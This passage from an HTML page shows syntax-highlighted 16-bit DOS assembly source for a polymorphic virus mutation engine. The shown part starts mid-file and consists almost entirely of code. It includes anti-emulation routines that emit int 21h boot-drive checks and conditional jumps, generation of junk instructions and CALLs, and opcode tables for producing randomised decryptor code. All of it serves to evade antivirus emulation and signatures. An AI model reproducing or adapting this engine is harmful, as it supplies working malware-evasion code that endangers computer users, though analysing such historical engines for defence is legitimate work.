        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                  </span><span class="sc1">; JAE</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">ok_this</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                  </span><span class="sc1">; JA</span><span class="sc0">
</span><span class="sc5">ok_this</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">011b</span><span class="sc0">                 </span><span class="sc1">; 0 - 3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">store_and_jump</span><span class="sc0">

</span><span class="sc5">get_bdrive</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">count_reg</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">  </span><span class="sc1">; is dx usable?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">end_antiemu</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">                 </span><span class="sc1">; mov ax,</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3305h</span><span class="sc0">                </span><span class="sc1">; get boot drive</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                  </span><span class="sc1">; check DL</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                   </span><span class="sc1">; compare with 00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                  </span><span class="sc1">; JNE</span><span class="sc0">

</span><span class="sc5">store_and_jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">21cdh</span><span class="sc0">                </span><span class="sc1">; int 21h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">82h</span><span class="sc0">                  </span><span class="sc1">; cmp</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc0">                 </span><span class="sc1">; cmp base</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                   </span><span class="sc1">; dl contains register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                   </span><span class="sc1">; dh contains value</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">emu_trick</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check2</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                  </span><span class="sc1">; cl contains type of jump</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">conditional_jump</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">emu_trick</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check2</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">end_antiemu</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">do_a_call</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0e8h</span><span class="sc0">                 </span><span class="sc1">; make a CALL</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_foo_instructions</span><span class="sc0"> </span><span class="sc1">; some shit</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                   </span><span class="sc1">; calculate offset</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">     </span><span class="sc1">; here we will CALL</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_foo_instructions</span><span class="sc0"> </span><span class="sc1">; again some shit</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">push_nr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; AH = usable register</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">no_pop_segment</span><span class="sc0">          </span><span class="sc1">; pop the IP</span><span class="sc0">

</span><span class="sc5">instructions</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; the data below this line is of use by the poly to create some of the</span><span class="sc0">
</span><span class="sc1">; various possible operations on registers in the trash generation part</span><span class="sc0">

</span><span class="sc1">;ONE BYTE ONLY</span><span class="sc0">
</span><span class="sc5">inc_16</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">040h</span><span class="sc0">    </span><span class="sc1">; INC REG16</span><span class="sc0">
</span><span class="sc5">dec_16</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">048h</span><span class="sc0">    </span><span class="sc1">; DEC REG16</span><span class="sc0">
</span><span class="sc5">mov_rr16</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">08bh</span><span class="sc0">    </span><span class="sc1">; general first byte</span><span class="sc0">
</span><span class="sc1">; + 0 (03h) ADD</span><span class="sc0">
</span><span class="sc1">; + 8 (0bh) OR</span><span class="sc0">
</span><span class="sc1">; + 10 (13h) ADC</span><span class="sc0">
</span><span class="sc1">; + 18 (1bh) SBB</span><span class="sc0">
</span><span class="sc1">; + 20 (23h) AND</span><span class="sc0">
</span><span class="sc1">; + 28 (2bh) SUB</span><span class="sc0">
</span><span class="sc1">; + 30 (33h) XOR</span><span class="sc0">
</span><span class="sc1">; + 38 (3bh) CMP</span><span class="sc0">
</span><span class="sc5">math_rr16</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc0">    </span><span class="sc1">; basic opcode</span><span class="sc0">
</span><span class="sc5">not_neg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0d0h</span><span class="sc0">
</span><span class="sc5">rot_1</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0d1h</span><span class="sc0">    </span><span class="sc1">; ROL/ROR/SHL/SHR/RCR/RCL/SAR/SAL REG16,1</span><span class="sc0">
</span><span class="sc5">rot_cl</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0d3h</span><span class="sc0">    </span><span class="sc1">; ROL REG16,CL</span><span class="sc0">
</span><span class="sc1">; +0h (0c0h)     ADD</span><span class="sc0">
</span><span class="sc1">; +8h (0c8h)     OR</span><span class="sc0">
</span><span class="sc1">; +10h (0d0h)    ADC</span><span class="sc0">
</span><span class="sc1">; +18h (0d8h)    SBB</span><span class="sc0">
</span><span class="sc1">; +20h (0e0h)    AND</span><span class="sc0">
</span><span class="sc1">; +28h (0e8h)    SUB</span><span class="sc0">
</span><span class="sc1">; +30h (0f0h)    XOR</span><span class="sc0">
</span><span class="sc1">; +38h (0f8h)    CMP</span><span class="sc0">
</span><span class="sc5">add_r16i</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c0h</span><span class="sc0">    </span><span class="sc1">; ADD REG16,IMMEDIATE 2 byte</span><span class="sc0">
</span><span class="sc5">lea_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b8h</span><span class="sc0">    </span><span class="sc1">; LEA REG16,something</span><span class="sc0">

</span><span class="sc5">smpe_encrypted_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; Poly data start - This will be only in memory!</span><span class="sc0">

</span><span class="sc5">poly_data_mem</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">enc_lenght</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">last_done</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">reg8bits</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">cmp_check</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">cmp_check2</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">count_reg</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0ffh</span><span class="sc0">
</span><span class="sc5">point_reg</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0ffh</span><span class="sc0">
</span><span class="sc5">pointer_di</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">secphs</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">isword</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">isrolror</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">push_nr</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">can_doda</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">es_mody</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; 00 don't modify, 01 can modify</span><span class="sc0">
</span><span class="sc5">ds_mody</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; 00 don't modify, 01 can modify</span><span class="sc0">
</span><span class="sc5">counter_pos</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">emu_trick</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">inverse</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">nocx</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0ffh</span><span class="sc0">
</span><span class="sc5">seg_sta</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0ffh</span><span class="sc0">
</span><span class="sc1">; Poly data end</span><span class="sc0">

</span><span class="sc5">poly_data_mem_end</span><span class="sc4">:</span><span class="sc0">

</span></div></body>
</html>
